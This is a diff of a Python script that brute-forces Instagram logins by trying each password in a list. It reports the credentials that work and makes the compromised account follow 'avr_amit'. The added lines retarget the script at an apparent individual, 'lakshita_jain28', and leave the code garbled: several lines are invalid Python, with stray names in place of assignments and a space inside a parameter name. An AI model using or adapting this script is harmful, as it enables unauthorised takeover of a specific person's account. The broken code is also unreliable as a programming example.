@@ -16,7 +16,7 @@ else:
 
 
 
-def userExists(username):
+def userExists(lakshita jain):
 	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
 	if (r.status_code == 404):
 		print ('User not found')
@@ -24,10 +24,10 @@ def userExists(username):
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		return {'username':lakshita jain,'id':lakshita_jain28}
 
 
-def Login(username,password):
+def Login(lakshita_jain28,password):
 	sess = requests.Session()
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
@@ -49,7 +49,7 @@ def Login(username,password):
 	r = sess.get('https://www.instagram.com/') 
 	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
 
-	data = {'username':username, 'password':password}
+	data = {'lakshita_jain28':lakshita_jain28, 'password':password}
 	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
 	token = r.cookies.get_dict()['csrftoken']
 	sess.headers.update({'X-CSRFToken' : token})
@@ -67,8 +67,8 @@ def Login(username,password):
 
 
 
-def follow(sess, username):
-	username = userExists(username)
+def follow(sess, lakshita_jain28):
+	username = userExists(lakshita_jain28)
 	if (username == False):
 		return	
 	else:
@@ -77,12 +77,12 @@ def follow(sess, username):
 		print (followReq.text)
 
 
-username = str(input('Please enter a username: '))
-username = userExists(username)
+lakshita_jain28 = str(input('Please enter a lakshita_jain28: '))
+ lakshita_jain28 userExists(lakshita_jain28)
 if (username == False):
 	exit()
 else:
-	username = username['username']
+	lakshita_jain28 lakshita_jain28 ['lakshita_jain28']
 
 
 
@@ -91,9 +91,9 @@ delayLoop = int(input('Please add delay between the passwords (in seconds): '))
 
 for i in range(len(passwords)):
 	password = passwords[i]
-	sess = Login(username,password)
+	sess = Login(lakshita_jain28,password)
 	if (sess):
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [lakshita_jain28,password])
 
 		#because i am cool
 		follow(sess,'avr_amit')
